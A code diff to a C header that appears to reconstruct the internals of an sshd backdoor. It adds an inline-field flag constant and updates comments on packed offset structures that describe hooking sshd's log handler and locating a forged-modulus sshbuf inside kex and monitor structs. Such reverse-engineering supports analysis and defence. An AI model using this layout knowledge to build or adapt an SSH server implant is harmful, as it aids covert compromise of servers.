@@ -1442,6 +1442,10 @@ typedef struct __attribute__((packed)) sshd_log_ctx {
  mm_log_handler_fn log_hook_entry; /* Hook trampoline we patch into sshd's handler slot. */
 } sshd_log_ctx_t;
 
+typedef enum {
+ SSHD_OFFSET_INDEX_INLINE_FLAG = 0x80 /* Sign-bit sentinel for sshbuf offset indices; when set, use inline struct fields. */
+} SshdOffsetIndexMaskConstants;
+
 /*
  * Compressed description of the monitor→kex layout used by sshd_find_forged_modulus_sshbuf: kex_sshbuf_qword_index selects the qword inside `struct kex` that is treated as a candidate `sshbuf *`, while monitor_pkex_table_dword_index selects the dword slot inside `struct monitor` that points at the active `kex **` pointer.
  */
@@ -1458,8 +1462,8 @@ typedef union __attribute__((packed)) sshd_offsets_kex {
  */
 typedef union __attribute__((packed)) sshd_offsets_sshbuf {
  struct __attribute__((packed)) {
-  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */
-  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */
+  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->d. */
+  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->size. */
  } bytes;
  u16 raw_value;
 } sshd_offsets_sshbuf_t;
@@ -1480,8 +1484,8 @@ typedef union __attribute__((packed)) sshd_offsets {
  struct __attribute__((packed)) {
   sbyte kex_sshbuf_qword_index; /* Qword index inside `struct kex` holding the candidate `sshbuf *`; -1 triggers brute-force scanning. */
   sbyte monitor_pkex_table_dword_index; /* Dword index inside `struct monitor` for the `kex **` slot; -1 uses monitor->pkex_table. */
-  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */
-  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */
+  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->d. */
+  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->size. */
  } bytes;
  u32 raw_value; /* Little-endian packed bytes: {kex_sshbuf_qword_index, monitor_pkex_table_dword_index, sshbuf_data_qword_index, sshbuf_size_qword_index}. */
 } sshd_offsets_t;
